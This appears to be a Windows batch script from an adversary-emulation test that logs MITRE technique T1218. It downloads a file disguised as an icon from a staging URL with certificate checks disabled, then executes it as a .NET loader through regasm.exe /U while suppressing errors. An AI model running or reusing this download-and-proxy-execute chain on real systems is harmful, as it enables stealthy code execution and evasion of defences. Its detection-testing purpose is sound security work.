@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET xY9qR2aB=%APPDATA%\10948\906c5ff2
SET mN4pL7kZ=5f054fd7.txt
SET vC8wH3jF=https://10.0.0.49/stage/2/icon.png?10948-7
SET dG5tR9uY=ITZEL-S2B
SET hJ2kL6pQ=10948
SET sW1xE4rT=7
SET zF7yU8iC=%PUBLIC%\\macula-simulations.log

REM Cache start timestamp ONCE before any operations
set tsvar=%DATE% %TIME%

REM ===== DEBUG LOGGING HELPERS =====
REM All debug lines appended to the same log file, suppressing errors

REM ===== STEP 1: Heartbeat fetch =====
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: heartbeat_start>> "!zF7yU8iC!" 2>nul
curl -k -s -o "!xY9qR2aB!\!mN4pL7kZ!" "!vC8wH3jF!" 2>nul
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: heartbeat_complete>> "!zF7yU8iC!" 2>nul

REM ===== STEP 2: Change directory =====
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: chdir_start>> "!zF7yU8iC!" 2>nul
cd /d "!xY9qR2aB!" >nul 2>&1
set chdir_er=%errorlevel%
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: chdir_result=!chdir_er!>> "!zF7yU8iC!" 2>nul

REM ===== STEP 3: Invoke Loader via regasm /U =====
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: regasm_start>> "!zF7yU8iC!" 2>nul
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe" /U "!mN4pL7kZ!" >NUL 2>&1
set regasm_er=%errorlevel%
echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: regasm_result=!regasm_er!>> "!zF7yU8iC!" 2>nul

REM ===== STEP 4: Write TTP log line =====
if !regasm_er! equ 0 (
    set result=OK
    set errdetail=
) else (
    set result=FAIL
    set errdetail=regasm returned errorlevel !regasm_er!
)
echo [!tsvar!][TTP][!dG5tR9uY!][!hJ2kL6pQ!]: T1218^|System Binary Proxy Execution=!result!:!errdetail!>> "!zF7yU8iC!" 2>nul

echo [!tsvar!][DEBUG][!dG5tR9uY!][!hJ2kL6pQ!]: log_write>> "!zF7yU8iC!" 2>nul

ENDLOCAL